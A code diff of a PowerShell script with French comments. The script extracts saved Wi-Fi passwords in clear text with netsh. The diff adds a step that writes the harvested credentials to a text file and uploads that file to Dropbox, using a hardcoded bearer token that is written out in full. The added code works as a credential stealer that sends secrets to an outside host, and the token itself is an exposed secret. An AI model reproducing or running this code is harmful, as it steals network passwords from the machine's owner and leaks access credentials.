@@ -19,13 +19,25 @@ foreach ($profile in $profiles) {
     # Détails du profil + key=clear
     $details = netsh wlan show profile name="$profile" key=clear
 
-    # --- Détection auto FR/EN de la ligne du mot de passe ---
-    $passwordLine = $details | Select-String "Contenu de la clé|Key Content"
+    $password = "No password"
 
-    if ($passwordLine) {
-        $password = ($passwordLine -split ":",2)[1].Trim()
+    # --- Parsing robuste FR/EN ---
+foreach ($line in $details) {
 
-        # Masquage des 4 derniers caractères
+    # Normalisation unicode (clé magique)
+    $cleanLine = $line.Normalize()
+
+    if ($cleanLine -match "Key Content|Contenu") {
+        $parts = $cleanLine -split ":",2
+        if ($parts.Count -eq 2) {
+            $password = $parts[1].Trim()
+            break
+        }
+    }
+}
+
+    # --- Masquage ---
+    if ($password -ne "No password") {
         $len = $password.Length
         if ($len -gt 4) {
             $masked = $password.Substring(0, $len - 4) + "****"
@@ -38,8 +50,7 @@ foreach ($profile in $profiles) {
         }
     }
     else {
-        $password = "No password"
-        $masked   = $password
+        $masked = $password
     }
 
     $results += [PSCustomObject]@{
@@ -48,4 +59,24 @@ foreach ($profile in $profiles) {
     }
 }
 
+# --- Affichage console ---
 $results | Format-Table -AutoSize
+
+# --- Export TXT fiable ---
+$results | Out-File "wifi_passwords.txt" -Width 300 -Encoding utf8
+
+# --- Upload vers Dropbox
+$token = "sl.u.AGYUSySgSgOwJdAxGjVNq767LpCLwoywoW1OAMBDwq_R6BxdTEcVH6rwTSoVBiecrQzEIIR0fSg1XzCSTyX_qusa-EnK9at5xB-5gQj1D80J2NMzfokQeukmaYFzkgcrdyXDmGoH1VbnydCGQ3pwngX35odmu_Yi4VHicBHI7qWtdDcT44nrlemSkPAofsUJWnLFoJd4ghyqTIt6kYM71IXrinZPGFcabLo_c3jqkN2DLiG34-lCqJd0qo5aSRZeFG9zzfr_ciKmNG-g-GBFG61tToqJpc6UqJvbWLg8kcYiOJSd3DtlKwzH3q0ZLtUHnY45YTDlv3eZgDdmPD5z_m4FrHQrfw2K1eKTq3-39E_A_deVvmWkEqapoenrDqLv2kiiuayhmLxJqfVRaivRZVqt1jcawAJfkhInkx_L0f5QAe36qvyZ7BboSQPc0buplnA_45JjoahY6wZ49nfT-LrIWgQnyvNgEiD1RFFKislO-jVFeMez0p64mhy49JuqQk2c7OADUC1f5guWmfMxOvwHgpP1WEurMVhj5FW-nym2wIkm-iSpSHNWmbXbW0iTlaFxxX90OEui7gA3uTNDHCmgk9FQwfZeH5NmJv1s47de6XY34_KtSGg_XM8H6XgXBairXl8eL-WX0fCsuKDcSwrtM_zmbaSoNmoyo-rJCAKBHSq5gvldf-niwwyQytUvAbDXrwaW0bzXWOneuYYjkejYDrqXFWLAIwk5n34w_EQwrsUddT5stc2MfMQb2cxtkQaJWfTWsol1vAd2pgWVNYMksheuysRhLcqJ_TT8qkq-4dCIfW3MVeXbTygZm14pRdE12g9rPX0JeDNSWs9N5VrF2vtct5JYAbNL77mzOdff3vIdTDxQElYWwGQXQWZTOiY9pio5f1mt_2zgWYefAAMympsWXvYRd_959OWhFLjM_q3JxMeByjlhD0piuBLMXTB84ITOxsgTOb_nVbDauKekph5QsMTl059KiIfmmQSNvMgIVzvMaYTJNvC_2phWOy6GrH58Y6RVEN0p1mUq9Nnca_7nrgz7Q4MNdGcwdQbWsY8d2EPRAE52ewArOI-IxKuRfB3WfDloCUjago883lF_xciBglnJgYNoUHs0b3a-UsqngmYfgSAdAkiZMqT3bmSVeIiugRjyGFQjX6fnAc04XS_zdlNnt-g1tj3V-ojH_nrx7VdGqQ3JbX0KTXOrg50XeLVkRHqM6G6KN7soS-BMGLUWVi1h0VJyGx0VNAGQa3DMrywmz2Dt7DlIH2uIqTN2g8VFj1hV5cp4AggHs-bEjJ2KLPsM7QCFWZXwdj8PiHFBL3etOCJKdShM4ASanQk"
+$filePath = "wifi_passwords.txt"
+$dropboxPath = "/wifi_passwords.txt"
+
+$headers = @{
+    "Authorization" = "Bearer $token"
+    "Dropbox-API-Arg" = "{""path"":""$dropboxPath"",""mode"":""overwrite"",""autorename"":true}"
+    "Content-Type" = "application/octet-stream"
+}
+
+Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
+    -Method Post `
+    -Headers $headers `
+    -InFile $filePath
